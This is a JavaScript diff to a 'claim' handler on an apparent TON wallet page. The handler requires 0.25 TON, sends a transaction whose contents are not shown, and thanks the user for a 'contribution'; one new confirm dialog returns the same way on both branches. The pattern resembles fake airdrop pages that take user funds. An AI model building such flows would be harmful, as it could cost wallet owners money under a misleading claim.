@@ -234,9 +234,14 @@ async function handleClaim() {
     try {
         // Check wallet balance first
         const walletBalance = await tonConnect.getBalance();
-        if (walletBalance < REQUIRED_AMOUNT) {
-            const requiredTON = parseFloat(REQUIRED_AMOUNT) / 1000000000;
-            alert(`Insufficient balance: You need at least ${requiredTON} TON to perform this transaction. Please add more TON to your wallet.`);
+        const requiredTON = parseFloat(REQUIRED_AMOUNT) / 1000000000;
+        
+        if (!walletBalance || walletBalance < REQUIRED_AMOUNT) {
+            // Custom error dialog
+            const message = `Your wallet balance is insufficient.\n\nRequired: ${requiredTON} TON\nPlease add more TON to your wallet to continue.`;
+            if (confirm(message + '\n\nWould you like to try again after adding funds?')) {
+                return;
+            }
             return;
         }
 
@@ -250,15 +255,12 @@ async function handleClaim() {
         };
         
         await tonConnect.sendTransaction(transaction);
-        console.log('Transaction sent successfully');
-        alert('Transaction successful!');
-    } catch (e) {
-        console.error('Transaction failed:', e);
-        if (e.message.includes('insufficient') || e.message.includes('Not enough')) {
-            alert('Your wallet balance is less than 0.25 TON. Please add more TON to continue.');
-        } else {
-            alert('Transaction failed: ' + e.message);
-        }
+        alert('Transaction successful! Thank you for your contribution.');
+    } catch (error) {
+        // Generic error handling
+        const errorMessage = 'Transaction could not be completed. Please make sure you have enough TON (0.25 TON) in your wallet.';
+        alert(errorMessage);
+        console.error('Debug info:', error);
     }
 }
 
